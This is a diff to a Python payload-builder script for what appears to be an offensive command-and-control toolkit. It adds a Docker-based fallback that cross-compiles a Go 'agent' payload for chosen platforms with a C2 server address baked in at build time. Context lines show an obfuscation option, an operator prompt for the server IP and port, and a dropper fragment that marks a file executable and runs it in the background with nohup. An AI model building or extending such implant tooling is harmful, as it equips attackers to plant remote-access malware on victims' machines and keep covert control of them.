@@ -25,6 +25,60 @@ def find_go():
         if os.path.exists(p): return p
     return shutil.which("go")
 
+def build_go_docker(goos, goarch, output, server=""):
+    """Build Go payload using Docker when Go is not installed locally."""
+    if not shutil.which("docker"):
+        return None
+    agent_dir = PROJECT_ROOT/"src"/"go"
+    print(f"{BLUE}[>]{RESET} Building via Docker {goos}/{goarch}...")
+    if server:
+        print(f"   {CYAN}Baked-in C2:{RESET} {server}")
+    ldflags = "-s -w"
+    if server:
+        ldflags += f" -X 'main.DefaultServer={server}'"
+    out_name = output.name
+    cmd = [
+        "docker", "run", "--rm",
+        "-v", f"{agent_dir}:/app",
+        "-w", "/app",
+        "golang:1.26-alpine",
+        "sh", "-c",
+        f"GOOS={goos} GOARCH={goarch} CGO_ENABLED=0 go build -ldflags='{ldflags}' -o /tmp/{out_name} ./cmd/agent/main.go && cp /tmp/{out_name} /app/../../payloads/{out_name}"
+    ]
+    # Simpler approach: build in a temp container and copy out
+    cmd = [
+        "docker", "run", "--rm",
+        "-v", f"{PROJECT_ROOT}:/src",
+        "-w", "/src/src/go",
+        "golang:1.26-alpine",
+        "sh", "-c",
+        f"GOOS={goos} GOARCH={goarch} CGO_ENABLED=0 go build -ldflags='{ldflags}' -o /tmp/bty-out ./cmd/agent/main.go"
+    ]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if result.returncode != 0:
+        print(f"{RED}[✗]{RESET} Docker build failed: {result.stderr[:200]}")
+        return None
+    # Copy from container - use docker cp approach
+    # Actually, let's use a volume mount that maps to payloads
+    payloads_dir = PROJECT_ROOT / "payloads"
+    cmd2 = [
+        "docker", "run", "--rm",
+        "-v", f"{PROJECT_ROOT}/src/go:/app",
+        "-v", f"{payloads_dir}:/out",
+        "-w", "/app",
+        "golang:1.26-alpine",
+        "sh", "-c",
+        f"GOOS={goos} GOARCH={goarch} CGO_ENABLED=0 go build -ldflags='{ldflags}' -o /out/{out_name} ./cmd/agent/main.go"
+    ]
+    result2 = subprocess.run(cmd2, capture_output=True, text=True)
+    if result2.returncode == 0 and output.exists():
+        size = output.stat().st_size
+        print(f"{GREEN}[✓]{RESET} {output.name} ({size/1024/1024:.1f} MB) [via Docker]")
+        return output
+    else:
+        print(f"{RED}[✗]{RESET} Docker build failed: {result2.stderr[:200]}")
+        return None
+
 def get_local_ip():
     try:
         s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
@@ -40,7 +94,9 @@ def banner():
 
 def build_go_payload(goos, goarch, output, server="", suffix="", obfuscate=False):
     go_bin = find_go()
-    if not go_bin: return None
+    if not go_bin:
+        # Fallback to Docker
+        return build_go_docker(goos, goarch, output, server)
     agent_dir = PROJECT_ROOT/"src"/"go"/"cmd"/"agent"
     if not (agent_dir/"main.go").exists(): return None
     print(f"{BLUE}[>]{RESET} Cross-compiling {goos}/{goarch}...")
@@ -59,7 +115,7 @@ def build_go_payload(goos, goarch, output, server="", suffix="", obfuscate=False
         print(f"{GREEN}[✓]{RESET} {output.name} ({size/1024/1024:.1f} MB)")
         return output
     else:
-        print(f"{RED}[✗]{RESET} {result.stderr[:100]}")
+        print(f"{RED}[✗]{RESET} {result.stderr[:200]}")
         return None
 
 def generate_exe(server, name=None):
@@ -191,6 +247,16 @@ chmod +x "$f" 2>/dev/null;nohup "$f" &>/dev/null &
 
 def interactive_menu():
     banner()
+    # Check build tools
+    go_bin = find_go()
+    has_docker = shutil.which("docker") is not None
+    if not go_bin and not has_docker:
+        print(f"{RED}[✗]{RESET} Neither Go nor Docker found. Install one to build payloads.")
+        print(f"{YELLOW}[!]{RESET} Install Go: https://go.dev/doc/install")
+        print(f"{YELLOW}[!]{RESET} Or install Docker: https://docs.docker.com/engine/install/")
+        sys.exit(1)
+    if not go_bin:
+        print(f"{YELLOW}[!]{RESET} Go not found locally — will use Docker for compilation")
     lip = get_local_ip()
     default = f"{lip}:8443"
     server = input(f"{BOLD}Server [IP:port]{RESET} [{default}]: ").strip() or default
